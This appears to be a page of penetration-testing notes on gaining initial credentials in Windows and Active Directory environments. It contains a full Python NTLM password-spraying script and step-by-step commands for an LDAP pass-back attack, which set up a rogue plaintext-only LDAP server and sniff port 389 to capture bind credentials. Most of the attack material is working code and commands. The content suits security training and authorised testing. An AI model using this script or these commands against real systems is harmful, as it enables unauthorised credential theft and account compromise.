# Initial Credential Access/Foothold

### [Broken link](/broken/pages/BtV0NvnjkOw6PtUUWwu3 "mention")OSINT

### Phishing

### NTLM and NetNTLM

* Applications that use platform/windows authentication can be brute forced.

<details>

<summary>ntlm_brute.py</summary>

{% code lineNumbers="true" %}
```python
#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt

class NTLMSprayer:
    def __init__(self, fqdn):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = True
        self.fqdn = fqdn

    def load_users(self, userfile):
        self.users = []
        lines = open(userfile, 'r').readlines()
        for line in lines:
            self.users.append(line.replace("\r", "").replace("\n", ""))

    def password_spray(self, password, url):
        print ("[*] Starting passwords spray attack using the following password: " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                count += 1
                continue
            if (self.verbose):
                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                    print ("[-] Failed login with Username: " + user)
        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

def main(argv):
    userfile = ''
    fqdn = ''
    password = ''
    attackurl = ''

    try:
        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
    except getopt.GetoptError:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = str(arg)
        elif opt in ("-f", "--fqdn"):
            fqdn = str(arg)
        elif opt in ("-p", "--password"):
            password = str(arg)
        elif opt in ("-a", "--attackurl"):
            attackurl = str(arg)

    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
        #Start attack
        sprayer = NTLMSprayer(fqdn)
        sprayer.load_users(userfile)
        sprayer.password_spray(password, attackurl)
        sys.exit()
    else:
        print ("ntlm_brute.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)



if __name__ == "__main__":
    main(sys.argv[1:])
```
{% endcode %}

</details>

### LDAP Bind Credentials

* Application has a pair of AD credentials that it uses to query LDAP and then verify the AD user's credentials. Few eg apps:
  * Gitlab
  * Jenkins
  * Custom-developed web applications
  * Printers
  * VPNs
* **LDAP Pass-back Attacks**
  * Access the web interface of above apps using default credentials.
  * Modify the LDAP server IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. Intercept this authentication to recover the LDAP credentials.
  * Hosting Rogue LDAP Server or use Netcat if possible
    * `sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`
    * `sudo dpkg-reconfigure -p low slapd`&#x20;
    * Use MDB Database
    * Ensure LDAP server only supports Plain & LOGIN authentication methods.
      * \#olcSaslSecProps.ldif (File to be configured)\
        `dn: cn=config`        \
        `replace: olcSaslSecProps`        \
        `olcSaslSecProps: noanonymous,minssf=0,passcred`&#x20;
      * `sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`&#x20;
      * `ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms`&#x20;
      * `sudo tcpdump -SX -i <network-iface> tcp port 389`&#x20;

### Configuration Files

* **Interesting Files**
  * Web application config files
  * Service configuration files
  * Registry keys
  * Centrally deployed applications
* **Automated Scan** - [Seatbelt](https://github.com/GhostPack/Seatbelt)

### AD Section - [initial-credential-access-foothold.md](../active-directory/enumeration/initial-credential-access-foothold.md "mention")
